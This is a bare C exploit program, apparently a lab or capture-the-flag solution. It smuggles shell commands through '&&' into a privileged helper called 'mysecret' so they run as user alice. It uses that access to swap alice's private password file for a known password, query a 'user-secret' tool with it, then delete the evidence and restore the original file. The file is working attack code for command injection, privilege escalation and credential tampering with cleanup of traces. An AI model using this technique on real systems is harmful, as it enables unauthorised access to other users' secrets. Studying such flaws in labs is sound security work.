#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define CACHE_MAX 1024

void execute_as_alice(char command[]) {
    char command_alice[CACHE_MAX];
    snprintf(command_alice, sizeof(command_alice), "{/home/alice/Public/mysecret \"&& %s \"} &>/dev/null", command);
#ifdef DEBUG
    printf("\nExecuting: %s\n", command_alice);
#endif
    FILE *fp;
    fp = popen(command_alice, "r");
    // system(command_alice);
}

void sanitize(char user[], char *arg) {
    int i, pos = 0;
    for (i = 0; i < 15 && arg != NULL && *arg != '\0'; i++) {
        if (*arg >= 'a' && *arg <= 'z') {
            user[pos++] = *arg;
        }
        arg++;
    }
    user[pos] = '\0';
}

int main(int argc, char *argv[])
{
    FILE *fp;
    char user[15];
	char command[CACHE_MAX], result[CACHE_MAX], path_to_private[CACHE_MAX];

    if (argc < 2) {
        printf("Please input username! \n");
        return 1;
    }

    sanitize(user, argv[1]);
    strcpy(path_to_private, "./");

    snprintf(command, sizeof(command), "mv -f /home/alice/Private/password-%s /home/alice/Private/password-temp;", user);
    execute_as_alice(command);

    snprintf(command, sizeof(command), "echo \'password\' > password-%s", user);
    execute_as_alice(command);

    snprintf(command, sizeof(command), "/home/alice/Public/user-secret %s password;", user);
    system(command);

    snprintf(command, sizeof(command), "rm -f /home/alice/Private/password-%s;", user);
    execute_as_alice(command);

    snprintf(command, sizeof(command), "mv -f /home/alice/Private/password-temp /home/alice/Private/password-%s;", user);
    execute_as_alice(command);

    // snprintf(command, sizeof(command), "%secho \'password\' > password-%s;", command, user);
    // printf("\n3:%s\n", command);
    // snprintf(command, sizeof(command), "/home/alice/Public/mysecret \"&& %s \"", command);

    // printf("\n%s\n", command);


	return 0;
}
